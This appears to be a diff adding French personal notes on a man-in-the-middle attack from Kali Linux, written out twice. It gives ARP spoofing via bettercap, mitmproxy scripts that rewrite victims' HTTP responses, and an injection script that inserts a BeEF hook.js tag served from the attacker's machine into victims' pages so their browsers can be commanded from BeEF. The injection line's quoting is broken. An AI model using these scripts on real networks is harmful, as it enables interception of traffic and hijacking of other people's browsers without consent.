@@ -1,0 +1,76 @@
+
+1- On crée un script python (simpleresponse.py):
+---
+from mitmproxy import ctx
+from mitmproxy import http
+
+def response(flow: http.HTTPFlow):
+    flow.response.content=bytes("ENCORE HACHED", "UTF-8")
+    ctx.log.info("REPONSE ENVOYEE")
+---
+
+2- On met en place le ARP spoofing (voir howto-bettercap.txt)
+
+3- On lance la commande d'interception:
+$ sudo mitmdump -s simplereponse.py --mode transparent --listen-host <ip_kali> --anticache
+>>> kali intercepte les requêtes de la victime et exécute le programme python en tant que réponse.
+
+4- On utilise le Framework beef (dans Exploitation tools) pour aller plus loin:
+On modifie les login et pwd dans /etc/beef-xss/config.yaml
+>>> credentials
+
+On lance beef (menu Exploitation tools).
+
+On injecte du code a l'aide d'un script python et mitmdump:
+Script (injection.py):
+---
+from mitmproxy import ctx
+from mitmproxy import http
+
+def response(flow: http.HTTPFlow):
+	reflector = bytes("<script src='http://<ip de kali>:3000/hook.js'></script">, "UTF-8")
+	flow.response.content = flow.response.content.replace(b"<head>", reflector)
+---
+
+$ sudo mitmdump -s injection.py --mode transparent --listen-host <ip_kali> --anticache
+
+Dans beef, le PC apparait sous Online brower.
+
+On clique sur l'ip et on va dans Commands.
+>@
+>@###############################################################################################
+>@
+>@* Script python (simpleresponse.py)
+>@---
+>@from mitmproxy import ctx
+>@from mitmproxy import http
+>@
+>@def response(flow: http.HTTPFlow):
+>@    flow.response.content=bytes("ENCORE HACHED", "UTF-8")
+>@    ctx.log.info("REPONSE ENVOYEE")
+>@---
+>@
+>@* Mettre en place l'ARP spoofing (voir howto-033-bettercap.txt)
+>@
+>@* On lance l'interception par script python
+>@$ sudo mitmdump -s simplereponse.py --mode transparent --listen-host <ip_kali> --anticache
+>@
+>@*Avec beef
+>@Login et pwd dans /etc/beef-xss/config.yaml
+>@
+>@Script (injection.py):
+>@---
+>@from mitmproxy import ctx
+>@from mitmproxy import http
+>@
+>@def response(flow: http.HTTPFlow):
+>@	reflector = bytes("<script src='http://<ip de kali>:3000/hook.js'></script">, "UTF-8")
+>@	flow.response.content = flow.response.content.replace(b"<head>", reflector)
+>@---
+>@
+>@$ sudo mitmdump -s injection.py --mode transparent --listen-host <ip_kali> --anticache
+>@
+>@Dans beef, Online brower/addr IP/Commands
+>@
+>@###############################################################################################
+>@
